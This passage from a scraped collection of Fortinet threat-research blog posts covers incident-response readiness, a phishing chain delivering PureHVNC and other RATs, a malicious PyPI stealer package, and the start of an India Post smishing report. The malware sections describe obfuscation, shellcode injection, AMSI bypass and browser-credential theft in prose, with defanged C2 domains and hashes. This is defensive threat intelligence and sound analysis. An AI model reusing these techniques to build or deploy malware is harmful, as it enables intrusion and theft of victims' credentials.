1ded5a6c54a7b10365c41bc850ce41f18d86435fbe9315c37bd767ecdf2551357b98622db7a62ace626dcc8af5bb7ac3726a968241c94612c5b9cb906175f5f3fb73e089d0a276617b9a213080f84d0e411592c7db5548790e3fe1c53295f5a3a676c7490086a4112f920936e57ee49e213aaffd12bb38bc433a073ddfae0f241235419877ccc1f1820cc75e773fe79f9ad0296dd8eea9aa44f511a7b6348cfd02aed2b21a90c82d2ca597340aabfa1d6c52302b08aa9f58e87893f6997c268102c8f22e9d2df7e051fffc49c7d2d240787fbe8395b4c3c96be40b5a111a03ce0a971e606e839e7d5e72dcea0a8a3d081c951250ce25b0ddaf2429bad87ebe3d12ae203fa199291754649a4e592fb0880339c88b07f1d69798114afca06b806114bf52de60e60a526141ffe61ef5afc2a3bc7d60d4086e644ec80e67513d268417ff585fadcf40e25ad9d09cf007d20f6691ccf31d93a5d48d25f7e811cb0ca422bfdc52a65905088b8b897a630c66c16ec5c2eba992c1c0722e5c8da9afa18124a871b7b837b217d271747337381fbbcff61edfe44e087c55921564b170a8c947d7ce4ce72ca7e0cebab472e2165a1ebbd9395a60d7478990fd4dbec2eb195f583001d3d4dc0a72c92cf27a390e95e1fad6229d18ab255b625985939eb4b90f7172dff66af9c34958a3b095210664c26a934b5f734b64ea3170f1507a12050372542f81546656de73e009b541ed12cbcc9feced4f6ab79f9e9a0ee9df148b6a76b1c8b026ac9e72ffe8ac1dd8d18abfbb4eb9c23bccb42ab9af2580ed72b7ad8378960ee2bfc32930e19f762f561f4a6448160de2bde6ce330309326d745f898790506401a3bac69f6669a3dd832650e4752ff68dd6f0cef35b43e6ad59d7df8a6b352c45e48e3564e259ade4f544d01900e8c3f9a74e52ae3bc62f74ddf0138b7d3de2c77c59663ec5d8969b688530a3c9228b72807bc17a9822d558c42ee8a47423b59d75e228198450f7a9a2e051eeca6388028a6deb8e9843951bf21575aae7f34bdc0aa362bb42eb5e4cff69b60d67f7f155a3e2b9b905c90a1cc2aac4ad753becec205160b78de45c11ed42f3da707c9cee0688fa4190233a9b4f1379ad9bd41e73eff193caab25960b6a990641ea8d412b5ba456b64ad165b7216c48b50ad87cd7ce19ae30cb709ea3ceb7107b129c64ec9c314157fc6a8df079262bc486ca7291799a7474196c7cf60158421a2d81697e24e693e76cd1da06b9bf1cce8224de916a5eb0c76c9ba7acc3833f8cdc7f7d31a72dfbe69d2be1f8b7cc48d208b80a6608c72c3c590f86d93b074533c0c4ef8a46b6d36ed52cc2b4c179d5d63792ee67c6f1702188695387c64991029dabd702d48eac3ea3f0eef280d4a1ebd3a506c226e98dcedc1b882a11addd25ded8ee5110249b5b1a391e4d77d327 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/valleyrat-campaign-targeting-chinese-speakers"
  },
  {
    "title": "Preparation Is Not Optional: 10 Incident Response Readiness Considerations for Any Organization",
    "content": "FortiGuard Labs Threat Research Let’s face it: Cyberthreats aren’t going anywhere. As technology continues to evolve and grow, so will the tactics and techniques used by threat actors. A recentreport from Statistaestimates the global cost of cybercrime to reach $15.63 trillion by 2029. To combat this, one of the most important things organizations can do is be prepared.According to the National Institute of Standards and Technology(NIST), the incident response life cycle can be broken down into four key stages, with the first, and arguably most important, being preparation. Your organization can take several proactive preparatory steps to ensure incident response (IR) readiness, including evaluating the existing threat landscape of your environment. These steps include conducting regular risk assessments, implementing comprehensive security policies, and providing continuous monitoring and threat intelligence gathering. Organizations can enhance their IR capabilities by investing in training programs and simulation exercises, enabling a swift and effective reaction to cyber incidents. Let’s examine several readiness activities that can be conducted well before any cybersecurity incident. These activities can ultimately help improve your organization’s overall IR and cybersecurity maturity. Feeling prepared for a worst-case scenario can be deceptive because untested organizations may not fully grasp what they are unaware of. Readiness assessments conducted by an external third party provide a critical perspective on your organization’s current state of readiness. Such assessments should include evaluating processes, procedures, personnel, documentation, and technology to gauge the maturity of your organization’s overall IR readiness. Unlike an audit, these assessments are designed to pinpoint potential weaknesses that could undermine your ability to respond effectively to an incident. Organizations can proactively address deficiencies outside active engagement by identifying people (capacity and skill gaps), processes, or technology. This proactive approach identifies opportunities to strengthen resilience against cyberthreats and enhances readiness. Ultimately, such assessments empower organizations to fortify their defenses and better protect themselves in an increasingly complex and challenging cybersecurity landscape. An IR plan serves as a comprehensive guidebook for managing cyber incidents. It meticulously outlines your organization’s response strategies before, during, and after incidents of any type and severity. It also details the structure of your IR team, specifying roles and responsibilities to ensure clarity and efficiency during an incident. The plan encompasses the essential steps of IR: preparation, detection and analysis, containment, eradication and recovery, and post-incident activity. Each step is designed to methodically address and mitigate the impact of incidents, ensuring a structured approach to incident management. Additionally, an effective plan defines goals and objectives, incident severity levels, and other crucial elements that contribute to a comprehensive response framework. Most importantly, the IR plan should be viewed as a living document. It requires regular updates and maintenance to remain effective and relevant. Fortinet recommends conducting a bi-annual review of the plan and an evaluation after each significant incident. This review process ensures that lessons learned are integrated into the plan and that any organizational changes are reflected and addressed. Without such a plan, organizations may make ad hoc decisions during a crisis, leading to costly and ineffective outcomes. A well-maintained IR plan provides a clear roadmap during incidents and enhances your organization’s ability to respond swiftly and effectively to challenges. Incident response playbooks are an essential extension of the broader IR plan, offering standardized procedures tailored to specific incidents. Such playbooks provide a clear, actionable framework that outlines the precise steps an organization must take to prepare for, respond to, and recover from each distinct type of incident. By focusing on specific incident scenarios, playbooks ensure that the response is not only swift but also effective and consistent. Each IR playbook provides detailed guidance on all phases of IR, including preparation, detection and analysis, containment, eradication, recovery, and post-incident activity. These documents should also designed to be comprehensive, featuring step-by-step action items assigned to specific members of the response team. This level of detail ensures that all tasks are accounted for and every objective is met during an incident response. Typical playbooks include ransomware, malware, business email compromise, denial-of-service attacks, data loss incidents, lost or stolen devices, insider threats, and zero-day vulnerabilities. The playbook should delineate specific actions and responsibilities for each scenario, ensuring the response team is well-prepared to handle an incident efficiently and confidently. Once an IR plan and playbook are in place, it’s time to test them with a tabletop exercise. According toNIST, a tabletop is “a discussion-based exercise where personnel… [discuss] their roles during an emergency and their responses to a particular emergency situation.” To simplify, a tabletop exercise is like a role-playing game. A facilitator provides the participants with facts, or “injects,” about a fictional cybersecurity incident. The participants then discuss how to respond to those facts using the IR plan and playbook as a guide. These exercises can be developed and catered to a specific audience, usually as an operational exercise for technical team members or a senior-level exercise where organizational leaders focus on business and policy-related decisions during an incident. Tabletop exercises should be conducted at least annually. However, a quarterly cycle is optimal for the teams to stay fresh and improve their response to cybersecurity incidents. Unfortunately, many security and IT professionals are unaware of what IR resources exist or how to access them. This makes it difficult for security teams to understand the context of an observed activity or efficiently discover an incident’s breadth and depth. It is also not uncommon for security and IT professionals to not know what data may be impacted when a system is compromised. In either scenario, critical time may be wasted tracking down business owners, building out network maps, or other activities that should have occurred well before an incident. This can significantly slow response efforts and increase business impact. System inventories should include information such as the business owner, system functionality, hostnames and IPs,data classification, data criticality, relevant audit or regulatory information, and other crucial identifying information that could be useful to incident responders. Such information can help identify and ensure timely responses to the most critical systems across the organization. Understanding the business processes associated with these systems is essential so informed decisions can be made throughout the incident. Network diagrams assist incident responders in understanding where systems are, how the network is segmented, and potential chokepoints or isolation points that can be used to help contain and eradicate a threat actor. Developing system inventories and network diagrams before an incident enables a more efficient and effective response, enabling responders to understand the organizational impact of a given system being compromised during an incident. Threat actors thrive on exploiting vulnerabilities in internet-facing systems as an initial access vector. Based on IR engagements handled by the FortiGuard IR team in the second half of 2023 and the first half of 2024, 46% of all incidents were directly the result of an exploit in a public-facing application. Vendors have often provided patches for these vulnerabilities weeks, months, and sometimes years before being exploited by the threat actor. While one can argue that patching is not foolproof due to zero-day vulnerabilities, patching known vulnerabilities efficiently narrows the organization’s threat landscape and removes low-hanging fruit that can be an enticing entry point. Vulnerability assessments are critical for evaluating and refining the effectiveness of a patch management process. These assessments are typically scoped to target internal or external IPs or systems, employing automated tools and manual techniques to scrutinize existing vulnerabilities across systems, applications, and network devices. It is essential during such assessments to meticulously review results to eliminate false positives and accurately assess the potential impact of vulnerabilities on the organization. While vulnerability assessments focus on known vulnerabilities, penetration tests play a complementary role in uncovering unknown weaknesses that may compromise your organization’s networks, systems, or applications. Penetration testing can be tailored to specific environments, such as internal or external networks, or even concentrate on individual segments within these networks. These assessments are designed to identify potential entry points threat actors could exploit to infiltrate external environments or pivot within internal networks. Alternatively, penetration tests may focus on a specific web or mobile application, conducting a thorough examination to identify potential vulnerabilities that could be exploited for malicious purposes or to gain unauthorized access within a network. Although regulatory requirements may mandate annual penetration tests for specific environments, it is prudent for many organizations to conduct these assessments more often. Given the dynamic nature of networked environments—with continual integration of new systems and technologies—vulnerability assessments should be scheduled frequently, often monthly, with penetration testing commonly occurring at least annually and, if possible, more often. Active Directory (AD) infrastructures typically expand as organizations grow organically. While integral to Identity and Access Management (IAM) programs, AD environments are often neglected in terms of thorough management and security oversight. Conducting a comprehensive review of the AD environment is crucial to ensuring alignment with critical recommendations from Microsoft and standards bodies, such as NIST. This alignment enhances the overall security posture of the AD configuration and facilitates the optimization of logging features to support data collection and drive more effective incident detection and investigation efforts. An assessment of an AD environment should include evaluating its configuration against industry best practices. This process aims to identify and remediate potential security gaps, misconfigurations, or vulnerabilities malicious actors could exploit. By implementing recommended protocols, organizations can significantly reduce their overall threat landscape and strengthen their defenses against unauthorized access and potential breaches. Reviewing and enhancing AD logging is essential for swift and accurate incident response. Properly configured logs provide crucial insights into user activities, authentication attempts, and system events, enabling security teams to detect and mitigate threats promptly. This proactive approach helps mitigate potential risks and ensures compliance with regulatory requirements and industry standards. Investing in a thorough review and continuous management of the AD environment is essential for maintaining robust IAM practices and bolstering overall cybersecurity resilience. Many cybersecurity incidents can persist undetected for weeks or even months, underscoring the critical role of logs in effective incident investigation. Adopting a risk-based approach is essential for determining which logs to capture, defining retention periods, and establishing the necessary level of detail to support the investigative process. By aggregating logs generated by devices, networks, and security solutions, organizations can correlate data to assist in investigations and detect anomalous behaviors across their environment. Centralized logging forms the foundation of an effective detection program, but monitoring this collated information is equally vital. Without robust monitoring, organizations can overlook or miss critical alerts, potentially escalating cybersecurity incidents. Therefore, organizations must diligently ensure responsiveness to anomalies and alerts identified through comprehensive logging and security alerting mechanisms. By integrating centralized logging and vigilant monitoring, organizations can proactively identify and respond to events before they escalate into full-blown incidents. This proactive stance enhances IR capabilities and strengthens overall cybersecurity defenses, safeguarding against potential threats in today’s dynamic threat landscape. Over the past year, the FortiGuard IR team has observed a notable rise in the use of valid credentials during their engagements, accounting for approximately 54% of initial access methods. This trend underscores the growing sophistication of attackers who exploit legitimate credentials to gain unauthorized access, often enabling them to bypass traditional security measures. To effectively combat this threat, organizations should prioritize profiling normal user behavior within their environments to identify deviations indicative of malicious activity. One powerful approach is the implementation ofUser and Entity Behavior Analytics(UEBA). UEBA leverages advanced algorithms and machine learning to monitor user actions, establish behavioral baselines, and detect anomalies that could signal security incidents. For organizations utilizingFortiSIEM, deploying FortiSIEM agents with UEBA enabled can facilitate detailed user activity data collection, which can help detect anomalous, malicious behavior. However, sophisticated tooling is not strictly necessary for user behavior analysis, provided robust logging practices exist (see item 9 above). Organizations can create comprehensive behavioral baselines by systematically logging various user activities, such as logon times, devices used for authentication, accessed systems, and utilized applications. These baselines enable the identification of deviations that might indicate potential cybersecurity incidents. Defining what constitutes normal behavior and establishing thresholds for abnormal activities are crucial steps. When anomalies are detected, they may indicate compromised accounts or insider threats, necessitating immediate investigation and response. Regardless of how user behavior analysis is conducted, it’s crucial to have a playbook in place for response and responders. Integrating behavior profiling into security strategies is essential for mitigating the increasing threat of credential misuse. By leveraging UEBA (or even basic logging and monitoring), organizations can create a dynamic and responsive security posture that can quickly adapt to identify and mitigate threats. This proactive approach enhances early detection of malicious activities, strengthens IR capabilities, and fortifies your organization’s security framework. While this list is not exhaustive, and every organization must take additional measures, it covers the most common weaknesses found within the organizations Fortinet works with. We highly recommend that organizations start by working through the first four items on the list sequentially, especially if they haven’t been done or are not currently in place. The remaining items should be prioritized based on your business objectives. Did you know that FortiGuard Incident Response and Advisory Services can assist with many of the proactive services outlined above? Talk with your account manager today to see how we can help! incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/preparation-is-not-optional-10-incident-response-readiness-considerations"
  },
  {
    "title": "PureHVNC Deployed via Python Multi-stage Loader",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High This past April, FortiGuard Labs uncovered a sophisticated attack that leveraged multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. However, this attack campaign didn’t end with VenomRAT, as the subsequently loaded plugin continued to deploy various types of malware into the victim’s environment. We recently identified a phishing campaign that also employs multiple layers of evasion techniques to deploy various malware into an infected environment. This campaign was aimed at employees and posed as a customer requesting a service. The email uses urgent language to deceive a victim into clicking a malicious attachment, initiating a series of harmful activities and deploying several types of malware. All the malware in this attack uses the same packing and obfuscation techniques, including a Python obfuscator, ‘Kramer,’ a shellcode generator, 'donut,' and a shellcode loader, 'laZzzy,' to conceal itself from detection. The deployed malware includes XWorm, Venom RAT, AsyncRAT, and PureHVNC. Figure 1 shows the attack chain. This threat report describes how this attack is delivered and analyzes the PureHVNC malware used in this campaign. The attack campaign starts with an email, shown in Figure 2. It implies that the inquiry email is from a customer and urges the recipient to open the attachment. This typical phishing email tactic uses job-related information and urgent language to deceive recipients into opening attachments or clicking links. The attachment is an HTML file that uses the “search-ms” functionality to query the “e_Statement” LNK file on remote file shares, as shown in Figure 3. Once the user opens the HTML file and clicks on “Open” to allow Windows Explorer to open, the malicious LNK file is shown in Windows Explorer and lures the user into executing it using a PDF icon. The LNK file contains a command to run a remote batch file using conhost.exe as the parent process. The attacker attempts to leverage the built-in Windows binary 'conhost.exe' for indirect execution to evade detection, as shown in Figure 4. This is an obfuscated batch file that hides the script by combining encoding tricks and string obfuscation. The file looks like UTF-16 encoding with Chinese characters because the bytes (FF FE) at the beginning can mislead a file editor into incorrectly detecting the encoding. Next, it performs a large number of character replacement operations with the specific charset. The de-obfuscation process is shown in Figures 5 and 6. The script begins by opening a decoy PDF file from the same remote file share. Next, it downloads two ZIP files via PowerShell, extracts all the content—including the Python Environment—into the folder \"%USERPOFILE%\\Downloads\\Python,\" sets the folder to hidden, and then runs the malicious Python program in sequence. Next, the decoy PDF is re-opened, initiating a persistence routine to download a second batch file and move it to the startup folder. The second ZIP file, used by the startup batch and containing several Python programs similar to those in the previous ZIP, is extracted to the “%USERPOFILE%\\Downloads\\Print” folder. Before completing all tasks, any unnecessary programs from subsequent tasks are removed. Each Python file is quite similar, as shown below. First, it imports a Base64 module to decode shellcode data and then decrypts it using an RC4 algorithm with a specific key. Finally, the code executes shellcode using an imported “ctypes” module. It should be noted that the RC4 key varies in each Python file. By tracking the same series of samples, we discovered a new Python shellcode loader. It's a compiled version of a Python file with an additional obfuscation layer added. The obfuscator, named \"Kramer,\" is available on GitHub, as shown in Figure 8. It obfuscates a Python file by encrypting the source code using an addition operation with a randomly generated key. The resulting obfuscated Python program combines the encrypted data with functions that limit the use of print and input commands, decode the encryption data, and execute the original source code. Finally, the program is compiled into a .pyc file and renamed with a .py extension. By extracting the key and encrypted data and following the decode function defined in the code, we obtained the source code. In this version, the code structure is similar, but the function names and variables are not obfuscated. The first shellcode primarily functions to decrypt and execute the next stage while bypassing AMSI/WLDP based on its configuration. The hack tool, \"donut,\" produces the shellcode, as shown in Figure 10. Once the decryption routine is completed, the decrypted data in memory reveals the flag, the APIs used for bypass mechanisms, and the entire PE file for the next stage, as seen in Figure 11. The second stage is a PE file that uses the Microsoft Management Console (MMC) icon, a built-in Windows program, to disguise itself as a regular application while functioning as an injector. This injector includes detailed debug information. As the program runs, each step of the injection process is displayed on the command line, as shown in Figure 12. We observed that a shellcode loader named \"laZzzy\" is publicly available on GitHub. It incorporates various execution techniques commonly used by malware and appears to be utilized in this stage for shellcode decryption, injection, and execution. Ultimately, the program uses the target and execution techniques selected by the attacker to inject the shellcode into notepad.exe and executes the shellcode via Early Bird APC Queue, as shown in Figure 13. The third stage involves a shellcode within notepad.exe, which is identical to the code found in the first shellcode. After decryption and bypassing AMSI/WLDP, the final payload is executed. In the next section, we will focus on PureHVNC, one of the malware identified in this attack campaign, along with additional plugins downloaded by the malware. We observed an unusual malware packed and obfuscated in the Remote Access Trojans (RAT) used in this attack campaign. It’s a .NET application containing a substantial block of built-in data. Its primary function is to decrypt its payload using the AES algorithm and then decompress it with the Gzip method. Once the DLL payload is extracted and loaded into memory, it employs its hard-coded class and method names to execute the payload's entry point, as shown in Figure 14. DLL Payload is protected by .NET Reactor, as seen in Figure 15. We partially de-obfuscated the program and renamed the functions. Its entry point was very easy to understand. After creating a mutex, the core function is then executed. In its core functionality, the program initially extracts the hardcoded configuration by performing base64 decoding followed by gzip decompression. Based on the flags in the configuration, it either sets the registry run key using PowerShell or prevents the system from sleeping by utilizing the Win32 API function, “SetThreadExecutionState,” as seen in Figure 16. Next, it attempts to communicate with the C2 server specified in the extracted configuration. Once the connection is established, it begins gathering victim information and reporting it to the C2 server, as shown in Figure 17. It abuses the Windows Management Instrumentation (WMI) system to gather information about the victim's system environment, including installed antivirus products, system and camera details, and user information. The VictimID is generated from the processor ID, disk serial number, memory serial number, and username. Additionally, the program searches for the paths of various extensions and applications based on a predefined list, as shown in Figures 18 and 19. Some applications also check the registry path to verify their installation. This list specifically targets crypto wallets, password managers, two-factor authenticators, and popular communication programs. After all the specified information is collected, it is sent to the C2 server to await further plugin loading. Figure 20 illustrates a method for handling incoming data from the C2 server after it has been preprocessed using gunzip and deserialization. When the program receives the plugin, it writes the plugin data and ID into the Windows Registry under the affected user’s HKEY_CURRENT_USER\\Software\\{VictimID}. The plugin data is then extracted, loaded into memory, and executed. Our analysis identified some details that helped us pinpoint the malware family. The same information appeared in the subsequently downloaded plugin, as seen below. In the following sections, we’ll elaborate on the plugins provided by the PureHVNC C2 server, which are obfuscated using the .NET Reactor. The initial plugin we received from the threat actor is a DLL file named “PluginRemoteDesktop.” As Figure 22 shows, its entry method is executed with the binary as a parameter to provide the module with C2 information. After extracting the C2 details, it communicates with the C2 server and executes the Remote Desktop function. Figure 23 shows one of the mouse-controlled functions and the APIs used by the RemoteDesktop program. PluginExecuting is a module responsible for executing additional files, updating the program, and even uninstalling malware. It follows a process similar to that of PluginRemoteDesktop at the entry point, using the C2 information extracted from parameters to communicate with the C2 server. It then waits to receive a packet to trigger the execution of the core function. The core function acts as a handler to process different commands based on their type. It supports six types of command, as illustrated in Table 1. Command Details DownloadAndExecuteDisk Execute a downloaded file DownloadAndUpdate Remove the current module and execute the downloaded file. UninstallConnection Delete the registry entry HKEY_CURRENT_USER\\Software\\{VictimID}, and remove the malware if it is not located in the %WINDOWS% folder. RestartConnection Start a new instance of the current module and terminate the existing process. CloseConnection Terminate the current process. DownloadAndExecuteMemory Run the downloaded payload in the designated process. Table 1: Commands PluginExecuting contains several important commands, particularly those related to downloading. Figure 24 illustrates the command used to create a hidden process that executes the downloaded file. These commands combine with a batch file to achieve both file deletion and execution, as shown in Figure 25. Additionally, theDownloadAndExecuteMemorycommand requires a binary and a target name as parameters. It injects the malicious binary into a specified target process using process hollowing and then resumes the injected process to execute the malicious code. Deploying multiple types of malware in an attack campaign is not unusual. In this case, the threat actor also uses complex, multilayer encryption to avoid detection across all the malware used in this campaign. In this article, we uncovered a phishing campaign targeting employees that employs a multi-stage execution flow and utilizes public hacking tools to evade detection. We also focused on one obfuscated payload, \"PureHVNC,\" detailing its functions and the additional plugins collected. Our observations indicate that it targets crypto wallets, password managers, and 2FA authenticators. Finally, it can carry out further attacks using its RemoteDesktop and Executing plugins. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.3771!trLNK/Agent.1B2F!trBAT/Agent.PSCL!trPython/Agent.PSCL!trMSIL/Agent.DWN!trMSIL/Agent.CFQ!trMSIL/Agent.DWN!trMSIL/Bladabindi.SSNY!trMSIL/GenericKD.61253965!trMSIL/Agent.7C2C!trMSIL/Agent.PEP!tr.dldr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. drvenomjh[.]duckdns[.]org vxsrwrm[.]duckdns[.]org ncmomenthv[.]duckdns[.]org ghdsasync[.]duckdns[.]org anachyyyyy[.]duckdns[.]org xoowill56[.]duckdns[.]org hxxps://float-suppose-msg-pulling[.]trycloudflare[.]com/ 16a4de0540181bab7c5d25fcdf90838a28f2dff4ed9e0e37de3f5f1ab20afe0a 062c5f5e9cdfd731912b262297e963b6d5e1b1d114184728065522f46a5eef2f 2b7ee0ccfa45d2f53098cd8aa4ce73cb00ace462d8490e6843bf05cd07854553 430300b8c527259805d29ab3fd150d9d297004ff77346cc07753290d84e77e95 503ce7bcefdffb96b5de78254f947598a410b86d3aaf597c7334e248c46dae5b 55134d705ccf881d011af949ad2fc0aa80dc7af50fa4a9db29b665647b869aec 561f4b4e2c16f21b0db015819340fc59484e4994022c4cca46cf778006d5d441 6b4f058ba41e829ff993e61b288e55552af3d98f9cd62483eeff088b26f6ab9b 71b797032458aab9b4a1a203e7ca413f009af1961cffb98590e34f672574599a 7292316900a0971aec0a302bc3c6632902d820804ce3b2375a9953744cab1bd9 72ce64d50f9aa15b21631307d2143f426364634a7a2ee4b401ef76bd88c4ff3b 8bbdd3b41a03b86f246564a23e9acd48f74428f372c4bfb0a9a3af42511661c7 8d28191f647572d5e159f35ae55120ddf56209a18f2ca95a28d3ca9408b90d68 90995c621718ae65ca0af4deb10a9cb895bd494df40a7b34031b17efcc63114a b393323b9834656a2999198d4f02c1a159c6034d3c20c483d22a30aab3810c0c b3bb7064af80abef417e6e7775a7e14b0bd27233fd66c2252e714a4dd2ee9c21 d4e8bf427c196d1d5ffca52a5af7162cc5cf4df730ee3fe65b4381ac79662a15 e5f7efb35b7316c7ace1c322559fa9a8680ddb1ac15bef7d17e5b84c767f5b75 95a33ba5550747baf72e39b020e6215b6047983eda17250408cd6f4c16a93089 1967661f7c32607f7cfcb9053aeb8dea0a9d8f49979e729be77a43628c91469f 7c4e613cf4db19f54030097687227809f965a951a26a44a882692ece6e642e3c 441c4502584240624f4af6d67eded476c781ff0b72afe95ea236cc87a50e5650 python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/purehvnc-deployed-via-python-multi-stage-loader"
  },
  {
    "title": "Malicious Packages Hidden in PyPI",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc.Severity level:High The FortiGuard Labs team has identified a malicious PyPI package affecting all platforms where PyPI packages can be installed. This discovery poses a significant risk to individuals and institutions that have installed these packages, potentially leading to the leakage of credentials and sensitive information. Given the high severity of this threat, it is crucial to focus on this specific PyPI package. This report discusses its potential impacts and emphasizes the importance of diligent security practices in managing software dependencies. On July 3, the Fortinet AI-driven OSS malware detection system identified a malicious package named zlibxjson version 8.2, published on June 29, 2024. This package contained a malicious URL that downloaded various files, including an executable (.exe) file packed with PyInstaller. The .exe file was unpacked to retrieve .pyc files, which were then decompiled into Python (.py) files. Among the numerous Python and DLL files discovered, three were particularly problematic: Discord_token_grabber.pyget_cookies.pypassword_grabber.py. These files are designed to steal sensitive information, such as Discord tokens, browser cookies, and stored passwords. We examine each of these files in the following sections. The provided code is malicious for several reasons, but primarily because it aims to steal sensitive information from Discord users and send it to an external server controlled by the attacker. 1. Token Extraction: The code extracts Discord tokens from the user's local machine by searching for patterns that match token formats in local files. Tokens are used to authenticate users with Discord’s API. Stealing these tokens allows an attacker to gain unauthorized access to the victim's Discord account. The class `extract_tokens` performs this search in local application data directories using regular expressions. The tokens are then validated and decrypted if necessary. 2. Decryption of Stored Data: The code includes functionality to decrypt stored passwords and tokens using the system's master key. This allows the attacker to access sensitive data stored securely by the system. 3. Data Exfiltration: The code sends the extracted tokens and other user information to the attacker's server by making HTTP requests to Discord's API endpoints. It gathers user profile information, billing details, guild memberships, and gift codes. The collected data is then formatted and sent to an external server, enabling the attacker to use or sell the stolen information. The `fetch_tokens` class collects this wide range of information using the stolen tokens. 4. Persistence and Evasion: The code includes retry mechanisms and various methods to ensure it can continue its operations even if some attempts fail. The collected data is then formatted and sent to an external server or presented in a format that can be easily sent to the attacker. This file includes some critical malicious activities, including cookies theft, decryption of stored data, and data exfiltration, 1. Cookie Theft: The code's primary purpose is to steal cookies from various web browsers, such as Chrome, Firefox, Brave, and Opera. Cookies often contain sensitive information like session tokens, login credentials, and other personal data. The code also accesses and copies browser data directories without user consent, indicating a clear malicious intent. 2. Decryption of Stored Data: The code decrypts stored cookies using the system's master key, which is extracted from the browser's local state files. This involves decrypting data that is typically securely stored. It unlocks encrypted cookie data, bypassing security mechanisms that protect user information. 3. Data Exfiltration: The decrypted cookies are saved to a file named `cookies.txt` located in the user's directory (`C:\\\\Users\\\\{getuser()}\\\\cookies.txt`), a tactic commonly used to collect and later exfiltrate sensitive data. This indicates an intent to gather and potentially transfer sensitive information. Additionally, the code creates temporary directories and files, possibly to hide its activities and ensure persistence. The provided code is malicious. It is designed to steal saved passwords from web browsers, specifically Google Chrome and Microsoft Edge, and decrypt them for unauthorized access. Here's a detailed analysis of why this code is malicious: Detailed Analysis: The functions `get_passwords_edge()` and `main()` access the databases where Chrome and Edge store login data to extract encrypted passwords. The code copies the `Login Data` file used by Chrome and Edge to a local file (`ChromeData.db`) to read its contents without locking issues. After extracting the encrypted passwords, the code decrypts them using the browser's encryption key. The extracted and decrypted data, including URLs, usernames, and passwords, are stored in a dictionary that can be sent to an attacker or saved for misuse. The code then removes the copied database file to clean up traces. Specific malicious elements include unauthorized access to browser data directories, decryption of sensitive data, and the potential exfiltration of collected passwords to an external server or attacker-controlled location. The identified malicious packages in PyPI are designed to steal sensitive information by accessing and decrypting stored data from web browsers, such as passwords and cookies. These actions can lead to unauthorized access to user accounts and the exfiltration of personal data, clearly classifying the software as malicious. It is crucial to remain vigilant and use detection systems like AI-driven OSS malware detection to identify and mitigate such threats, ensuring user privacy and security are maintained. FortiGuard AntiVirusdetects the malicious files identified in this report as Discord_token_grabber.pyc: <Python/Agent.OT!tr>Get_cookies.pyc:<Python/Agent.AZH!tr>Password_grabber.pyc: <Python/Agent.BG!tr>MinGCC-x64.exe:<Python/Stealer.804C!tr.pws> The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hash (sha256) Detection Dscord_token_grabber.pyc f49ba791814001b3d4101685bfebb635cdaf3103407a08171bb5d6bbe3e79c77 <Python/Agent.OT!tr> Get_cookies.pyc f7e8a57b54489b5b3de66a1d21534ced3d2a2fb1ce8d03c69d4672e62aa00dca <Python/Agent.AZH!tr> Password_grabber.pyc 589d438226abfec8f71ab7724c68011303f82febb6786fd0c57571b0769764f3 <Python/Agent.BG!tr> MinGCC-x64.exe 348ee268ef62af51add78b46df9fe8e2bdf41166d19084af75498333e81e6f3b <Python/Stealer.804C!tr.pws> python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hidden-in-pypl"
  },
  {
    "title": "Phishing Campaign Targeting Mobile Users in India Using India Post Lures",
    "content": "FortiGuard Labs Threat Research Impacted Users:iPhone users in IndiaImpact:Possible financial loss; stolen information can be used for future attacksSeverity Level:Medium The FortiGuard Labs Threat Research team recently observed a number of social media posts commenting on a fraud campaign targeting India Post users. India Post is India’s government-operated postal system. It is part of the Ministry of Communications and has a vast network of over 150,000 post offices across the country, making it one of the largest postal systems in the world. In this campaign, iPhone users are being targeted by smishing attacks claiming to be from India Post. This scam involves sending an iMessage to iPhone users that falsely claims that a package is waiting at an India Post warehouse. Publicreportingsuggests this campaign is being attributed to a China-based threat actor known as theSmishing Triad. This group has previously targeted other regions, including the US, UK, EU, UAE, KSA, and, most recently, Pakistan. We have observed third-party email addresses such as Hotmail, Gmail, or Yahoo being used in phishing emails on iMessage. Apple allows users to create an Apple ID using these third-party email addresses as the primary email associated with their Apple ID. Once the Apple ID is created and configured for iMessage, the sender can use that third-party email address to send messages through iMessage. The messages often contain a short URL, leading to a fraudulent website. Upon investigation, we discovered a significant number of newly registered domains being used for current and potential phishing scams. This blog highlights the tools and methods used to propagate such phishing campaigns and explores the scale of these operations, the tactics employed by threat actors, and other 